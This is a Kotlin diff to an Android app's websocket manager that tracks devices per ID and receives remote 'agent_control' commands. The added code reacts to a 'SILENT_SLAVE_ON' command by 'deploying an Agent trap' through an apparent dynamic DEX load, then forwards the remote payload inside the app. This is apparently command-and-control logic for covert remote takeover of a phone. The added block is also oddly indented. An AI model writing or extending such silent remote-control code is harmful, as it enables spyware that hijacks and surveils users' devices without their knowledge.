@@ -36,6 +36,7 @@ object SocketManager {
                 put("topic", "realtime:tracking:$currentDeviceId")
                 put("event", "broadcast")
                 put("payload", wrap)
+                put("ref", "3")
             }
             webSocket?.send(outer.toString())
         } catch(e: Exception) {}
@@ -108,12 +109,27 @@ object SocketManager {
 
             override fun onMessage(webSocket: WebSocket, text: String) {
                 try {
-                    val json = JSONObject(text)
-                    if (json.optString("event") == "broadcast") {
-                        val payload = json.optJSONObject("payload")
-                        if (payload != null && payload.optString("event") == "agent_control") {
-                            val innerPayload = payload.optJSONObject("payload")?.optJSONObject("data")
-                            if (innerPayload != null) {
+                                    val json = JSONObject(text)
+                if (json.optString("event") == "broadcast") {
+                    val payload = json.optJSONObject("payload")
+                    if (payload != null && payload.optString("event") == "agent_control") {
+                        val innerPayload = payload.optJSONObject("payload")?.optJSONObject("data")
+                        if (innerPayload != null) {
+                            val action = innerPayload.optString("action")
+                            if (action == "SILENT_SLAVE_ON") {
+                                DebugLogger.log("WS", "Intercepting SILENT_SLAVE_ON. Deploying Agent trap dynamically.")
+                                appContext?.let { ctx ->
+                                    val bridge = DynamicUIManager.CortexBridge(ctx)
+                                    bridge.triggerTrap("DEX", "Agent")
+                                    
+                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                        val intent = android.content.Intent("com.cortex.action.AGENT_CONTROL").apply {
+                                            putExtra("payload", innerPayload.toString())
+                                        }
+                                        ctx.sendBroadcast(intent)
+                                    }, 2500)
+                                }
+                            } else {
                                 val intent = android.content.Intent("com.cortex.action.AGENT_CONTROL").apply {
                                     putExtra("payload", innerPayload.toString())
                                 }
@@ -121,6 +137,7 @@ object SocketManager {
                             }
                         }
                     }
+                }
                 } catch(e: Exception) {}
 
                 if (text.contains("phx_reply") && text.contains("\"status\":\"ok\"")) {
